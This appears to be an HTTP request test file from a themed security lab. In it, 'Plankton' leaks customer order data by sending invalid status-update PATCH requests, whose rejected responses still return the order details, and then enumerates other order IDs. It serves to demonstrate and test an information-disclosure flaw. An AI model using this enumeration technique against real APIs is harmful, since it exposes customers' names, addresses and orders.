# @import ../common/setup.http
@host = {{base_host}}/v305

# Plankton discovers he can leak order data by triggering validation errors.
# The handler returns order details even when the update is rejected!

### Step 1: Try to set an order to its current state (invalid transition)
# Order 1 is in "created" state - trying to set it to "created" is rejected
# but the order data is returned anyway!
PATCH /orders/1/status
X-API-Key: {{chum_bucket_api_key}}
Content-Type: application/x-www-form-urlencoded

status=created

?? status == 200
?? js response.parsedBody.updated == false
?? js response.parsedBody.order_id != null
?? js response.parsedBody.delivery_address != null


### Step 2: Enumerate more orders
PATCH /orders/2/status
X-API-Key: {{chum_bucket_api_key}}
Content-Type: application/x-www-form-urlencoded

status=created

?? status == 200


### Plankton can now enumerate ALL orders in the system!
# Customer names, delivery addresses, order totals - full disclosure
